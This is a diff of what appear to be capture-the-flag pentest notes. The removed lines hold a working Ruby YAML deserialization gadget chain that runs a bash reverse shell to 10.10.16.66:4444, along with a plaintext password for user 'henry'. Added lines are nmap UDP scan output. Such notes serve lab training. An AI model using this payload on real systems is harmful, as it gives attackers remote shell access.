@@ -17,25 +17,6 @@ dv.paragraph("```bash\n" + command + "\n```");
 Editing Box
 
 ```
----
-- !ruby/object:Gem::Installer
-    i: x
-- !ruby/object:Gem::SpecFetcher
-    i: y
-- !ruby/object:Gem::Requirement
-  requirements:
-    !ruby/object:Gem::Package::TarReader
-    io: &1 !ruby/object:Net::BufferedIO
-      io: &1 !ruby/object:Gem::Package::TarReader::Entry
-         read: 0
-         header: "abc"
-      debug_output: &1 !ruby/object:Net::WriteAdapter
-         socket: &1 !ruby/object:Gem::RequestSet
-             sets: !ruby/object:Net::WriteAdapter
-                 socket: !ruby/module 'Kernel'
-                 method_id: :system
-             git_set: /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.66/4444 0>&1'
-         method_id: :resolve
 
 ```
 
@@ -53,9 +34,9 @@ dv.paragraph("```bash\n" + command + "\n```");
 ## Provided Credentials
 ---
 
-| Username | Password           | Notes |
-| -------- | ------------------ | ----- |
-| henry:   | Q3c1AqGHtoI0aXAYFH |       |
+| Username | Password | Notes |
+| -------- | -------- | ----- |
+|          |          |       |
 
 ---
 
@@ -63,10 +44,11 @@ dv.paragraph("```bash\n" + command + "\n```");
 ## Open Ports
 ---
 
-| Port | Service | Notes |     |
-| ---- | ------- | ----- | --- |
-| 22   | ssh     |       |     |
-| 80   | http    |       |     |
+| Port                                                                                                                                                                                                                                                                                                                                                                                                              | Service | Notes |
+| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------- | ----- |
+| 22                                                                                                                                                                                                                                                                                                                                                                                                                | ssh     |       |
+| 80                                                                                                                                                                                                                                                                                                                                                                                                                | http    |       |
+| PORT      STATE         SERVICE<br>68/udp    open\|filtered dhcpc<br>161/udp   open          snmp<br>497/udp   open\|filtered retrospect<br>593/udp   open\|filtered http-rpc-epmap<br>631/udp   open\|filtered ipp<br>1023/udp  open\|filtered unknown<br>1812/udp  open\|filtered radius<br>1813/udp  open\|filtered radacct<br>5632/udp  open\|filtered pcanywherestat<br>49200/udp open\|filtered unknown<br> |         |       |
 
 ---
 
